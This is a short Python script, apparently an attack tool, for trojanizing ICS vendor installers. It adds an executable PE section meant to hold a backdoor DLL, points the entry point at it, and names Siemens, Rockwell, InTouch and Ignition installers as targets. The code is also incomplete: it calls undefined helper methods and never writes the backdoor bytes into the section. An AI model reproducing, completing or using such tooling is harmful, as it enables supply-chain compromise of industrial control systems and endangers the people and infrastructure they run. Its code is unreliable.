# trojanize_ics_installer.py - Inject backdoor into vendor installer
import pefile
import os

class ICSInstallerTrojaner:
    def __init__(self, clean_installer, backdoor_dll):
        self.installer = clean_installer
        self.backdoor = backdoor_dll

    def inject_backdoor(self):
        """
        Modify installer to drop backdoor DLL
        """
        # Parse installer PE
        pe = pefile.PE(self.installer)

        # Add new section for backdoor
        new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
        new_section.Name = b'.bd\x00\x00\x00\x00\x00'  # .bd section
        new_section.Misc_VirtualSize = len(self.backdoor)
        new_section.VirtualAddress = self.calculate_next_virtual_address(pe)
        new_section.SizeOfRawData = len(self.backdoor)
        new_section.PointerToRawData = self.calculate_next_raw_offset(pe)
        new_section.Characteristics = 0xE0000020  # CODE | EXECUTE | READ | WRITE

        # Append section
        pe.__sections__.append(new_section)

        # Modify entry point to execute backdoor first
        original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress

        # Backdoor code jumps back to original entry point after execution

        # Write trojanized installer
        pe.write(filename=self.installer + ".trojan.exe")

        print("[+] Installer trojanized successfully")

# Target ICS software installers:
# - TIA Portal installer
# - RSLogix 5000 installer
# - InTouch installer
# - Ignition installer
